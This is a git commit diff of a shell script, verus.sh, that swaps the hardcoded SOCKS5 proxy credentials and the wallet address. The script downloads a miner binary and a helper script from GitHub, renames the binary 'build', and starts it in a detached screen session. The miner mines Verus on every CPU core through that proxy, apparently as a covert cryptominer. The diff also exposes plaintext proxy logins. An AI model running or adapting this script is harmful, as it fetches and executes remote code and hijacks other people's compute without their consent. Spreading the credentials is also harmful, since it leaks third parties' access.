d3e43da78d549f9ab54d0a237f226e756e5503dc
mynameokta11 <90979709+mynameokta11@users.noreply.github.com>
2021-11-01 14:11:12 +0800

    Update verus.sh

--- verus.sh
+++ verus.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-proxy="socks5://ewean:dikamarmandi@143.198.163.97:333"
+proxy="socks5://stktplsv:35ldvwc7uo56@209.127.191.180:9279"
 array[0]="0001"
 array[1]="0002"
 array[2]="0003"
@@ -11,6 +11,6 @@ wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile
 wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u REHQm35bg5MEJrrrPVxwHh1DKw7jFXW5kw.worker-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
 echo succes
